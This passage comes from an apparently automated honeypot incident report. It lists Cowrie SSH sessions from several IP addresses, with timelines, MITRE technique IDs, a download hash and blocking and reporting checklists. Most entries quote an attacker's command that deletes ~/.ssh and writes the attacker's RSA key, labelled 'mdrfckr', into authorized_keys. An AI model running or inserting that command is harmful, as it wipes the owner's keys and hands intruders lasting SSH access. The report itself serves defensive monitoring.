| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:14` | `cowrie.session.connect` |
| `2026-06-12 13:36:14` | `cowrie.client.version` |
| `2026-06-12 13:36:15` | `cowrie.client.kex` |
| `2026-06-12 13:36:15` | `cowrie.login.success` |
| `2026-06-12 13:36:15` | `cowrie.session.params` |
| `2026-06-12 13:36:15` | `cowrie.command.input` |
| `2026-06-12 13:36:15` | `cowrie.command.failed` |
| `2026-06-12 13:36:16` | `cowrie.log.closed` |
| `2026-06-12 13:36:16` | `cowrie.session.params` |
| `2026-06-12 13:36:16` | `cowrie.command.input` |
| `2026-06-12 13:36:16` | `cowrie.session.file_download` |
| `2026-06-12 13:36:16` | `cowrie.log.closed` |
| `2026-06-12 13:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef8057a606e

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:18` | `cowrie.session.connect` |
| `2026-06-12 13:36:18` | `cowrie.client.version` |
| `2026-06-12 13:36:18` | `cowrie.client.kex` |
| `2026-06-12 13:36:19` | `cowrie.login.success` |
| `2026-06-12 13:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e51f16cb29

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:18` | `cowrie.session.connect` |
| `2026-06-12 13:36:18` | `cowrie.client.version` |
| `2026-06-12 13:36:18` | `cowrie.client.kex` |
| `2026-06-12 13:36:19` | `cowrie.login.success` |
| `2026-06-12 13:36:19` | `cowrie.session.params` |
| `2026-06-12 13:36:19` | `cowrie.command.input` |
| `2026-06-12 13:36:19` | `cowrie.command.failed` |
| `2026-06-12 13:36:20` | `cowrie.log.closed` |
| `2026-06-12 13:36:20` | `cowrie.session.params` |
| `2026-06-12 13:36:20` | `cowrie.command.input` |
| `2026-06-12 13:36:20` | `cowrie.session.file_download` |
| `2026-06-12 13:36:20` | `cowrie.log.closed` |
| `2026-06-12 13:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-309a755031dd

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:22` | `cowrie.session.connect` |
| `2026-06-12 13:36:22` | `cowrie.client.version` |
| `2026-06-12 13:36:23` | `cowrie.client.kex` |
| `2026-06-12 13:36:23` | `cowrie.login.success` |
| `2026-06-12 13:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c0333c0646

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:41` | `cowrie.session.connect` |
| `2026-06-12 13:36:41` | `cowrie.client.version` |
| `2026-06-12 13:36:41` | `cowrie.client.kex` |
| `2026-06-12 13:36:42` | `cowrie.login.success` |
| `2026-06-12 13:36:43` | `cowrie.session.params` |
| `2026-06-12 13:36:43` | `cowrie.command.input` |
| `2026-06-12 13:36:43` | `cowrie.command.failed` |
| `2026-06-12 13:36:43` | `cowrie.log.closed` |
| `2026-06-12 13:36:43` | `cowrie.session.params` |
| `2026-06-12 13:36:43` | `cowrie.command.input` |
| `2026-06-12 13:36:43` | `cowrie.session.file_download` |
| `2026-06-12 13:36:43` | `cowrie.log.closed` |
| `2026-06-12 13:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd542d43ec6

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-06-12 13:36 |
| **Last Seen** | 2026-06-12 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:36:46` | `cowrie.session.connect` |
| `2026-06-12 13:36:46` | `cowrie.client.version` |
| `2026-06-12 13:36:46` | `cowrie.client.kex` |
| `2026-06-12 13:36:46` | `cowrie.login.success` |
| `2026-06-12 13:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2df6ce3365

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:37 |
| **Last Seen** | 2026-06-12 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:37:56` | `cowrie.session.connect` |
| `2026-06-12 13:37:56` | `cowrie.client.version` |
| `2026-06-12 13:37:56` | `cowrie.client.kex` |
| `2026-06-12 13:37:56` | `cowrie.login.success` |
| `2026-06-12 13:37:56` | `cowrie.session.params` |
| `2026-06-12 13:37:56` | `cowrie.command.input` |
| `2026-06-12 13:37:56` | `cowrie.command.failed` |
| `2026-06-12 13:37:56` | `cowrie.log.closed` |
| `2026-06-12 13:37:56` | `cowrie.session.params` |
| `2026-06-12 13:37:56` | `cowrie.command.input` |
| `2026-06-12 13:37:56` | `cowrie.session.file_download` |
| `2026-06-12 13:37:56` | `cowrie.log.closed` |
| `2026-06-12 13:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1a8b9b17a9

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:37 |
| **Last Seen** | 2026-06-12 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:37:57` | `cowrie.session.connect` |
| `2026-06-12 13:37:57` | `cowrie.client.version` |
| `2026-06-12 13:37:57` | `cowrie.client.kex` |
| `2026-06-12 13:37:57` | `cowrie.login.success` |
| `2026-06-12 13:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723b667418b5

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:38 |
| **Last Seen** | 2026-06-12 13:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:38:08` | `cowrie.session.connect` |
| `2026-06-12 13:38:08` | `cowrie.client.version` |
| `2026-06-12 13:38:08` | `cowrie.client.kex` |
| `2026-06-12 13:38:09` | `cowrie.login.success` |
| `2026-06-12 13:38:09` | `cowrie.session.params` |
| `2026-06-12 13:38:09` | `cowrie.command.input` |
| `2026-06-12 13:38:10` | `cowrie.command.failed` |
| `2026-06-12 13:38:10` | `cowrie.log.closed` |
| `2026-06-12 13:38:10` | `cowrie.session.params` |
| `2026-06-12 13:38:10` | `cowrie.command.input` |
| `2026-06-12 13:38:10` | `cowrie.session.file_download` |
| `2026-06-12 13:38:10` | `cowrie.log.closed` |
| `2026-06-12 13:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f99681104294

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:38 |
| **Last Seen** | 2026-06-12 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:38:13` | `cowrie.session.connect` |
| `2026-06-12 13:38:13` | `cowrie.client.version` |
| `2026-06-12 13:38:13` | `cowrie.client.kex` |
| `2026-06-12 13:38:14` | `cowrie.login.success` |
| `2026-06-12 13:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94eddf251746

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:38 |
| **Last Seen** | 2026-06-12 13:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:38:50` | `cowrie.session.connect` |
| `2026-06-12 13:38:50` | `cowrie.client.version` |
| `2026-06-12 13:38:50` | `cowrie.client.kex` |
| `2026-06-12 13:38:51` | `cowrie.login.success` |
| `2026-06-12 13:38:51` | `cowrie.session.params` |
| `2026-06-12 13:38:51` | `cowrie.command.input` |
| `2026-06-12 13:38:51` | `cowrie.command.failed` |
| `2026-06-12 13:38:51` | `cowrie.log.closed` |
| `2026-06-12 13:38:52` | `cowrie.session.params` |
| `2026-06-12 13:38:52` | `cowrie.command.input` |
| `2026-06-12 13:38:52` | `cowrie.session.file_download` |
| `2026-06-12 13:38:52` | `cowrie.log.closed` |
| `2026-06-12 13:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8dc72b0a9cc

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:38 |
| **Last Seen** | 2026-06-12 13:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:38:54` | `cowrie.session.connect` |
| `2026-06-12 13:38:54` | `cowrie.client.version` |
| `2026-06-12 13:38:54` | `cowrie.client.kex` |
| `2026-06-12 13:38:54` | `cowrie.login.success` |
| `2026-06-12 13:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8e45e34a8a7

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:39 |
| **Last Seen** | 2026-06-12 13:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:39:42` | `cowrie.session.connect` |
| `2026-06-12 13:39:42` | `cowrie.client.version` |
| `2026-06-12 13:39:42` | `cowrie.client.kex` |
| `2026-06-12 13:39:43` | `cowrie.login.success` |
| `2026-06-12 13:39:43` | `cowrie.session.params` |
| `2026-06-12 13:39:43` | `cowrie.command.input` |
| `2026-06-12 13:39:43` | `cowrie.command.failed` |
| `2026-06-12 13:39:44` | `cowrie.log.closed` |
| `2026-06-12 13:39:44` | `cowrie.session.params` |
| `2026-06-12 13:39:44` | `cowrie.command.input` |
| `2026-06-12 13:39:44` | `cowrie.session.file_download` |
| `2026-06-12 13:39:44` | `cowrie.log.closed` |
| `2026-06-12 13:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d10bceae6745

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:39 |
| **Last Seen** | 2026-06-12 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:39:47` | `cowrie.session.connect` |
| `2026-06-12 13:39:47` | `cowrie.client.version` |
| `2026-06-12 13:39:48` | `cowrie.client.kex` |
| `2026-06-12 13:39:49` | `cowrie.login.success` |
| `2026-06-12 13:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4361708fae0

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:40 |
| **Last Seen** | 2026-06-12 13:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:40:46` | `cowrie.session.connect` |
| `2026-06-12 13:40:46` | `cowrie.client.version` |
| `2026-06-12 13:40:46` | `cowrie.client.kex` |
| `2026-06-12 13:40:47` | `cowrie.login.success` |
| `2026-06-12 13:40:48` | `cowrie.session.params` |
| `2026-06-12 13:40:48` | `cowrie.command.input` |
| `2026-06-12 13:40:48` | `cowrie.command.failed` |
| `2026-06-12 13:40:48` | `cowrie.log.closed` |
| `2026-06-12 13:40:48` | `cowrie.session.params` |
| `2026-06-12 13:40:48` | `cowrie.command.input` |
| `2026-06-12 13:40:48` | `cowrie.session.file_download` |
| `2026-06-12 13:40:48` | `cowrie.log.closed` |
| `2026-06-12 13:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7379ea05a0f4

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:40 |
| **Last Seen** | 2026-06-12 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:40:51` | `cowrie.session.connect` |
| `2026-06-12 13:40:51` | `cowrie.client.version` |
| `2026-06-12 13:40:51` | `cowrie.client.kex` |
| `2026-06-12 13:40:52` | `cowrie.login.success` |
| `2026-06-12 13:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed2894019d4f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:41 |
| **Last Seen** | 2026-06-12 13:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:41:40` | `cowrie.session.connect` |
| `2026-06-12 13:41:40` | `cowrie.client.version` |
| `2026-06-12 13:41:40` | `cowrie.client.kex` |
| `2026-06-12 13:41:41` | `cowrie.login.success` |
| `2026-06-12 13:41:41` | `cowrie.session.params` |
| `2026-06-12 13:41:41` | `cowrie.command.input` |
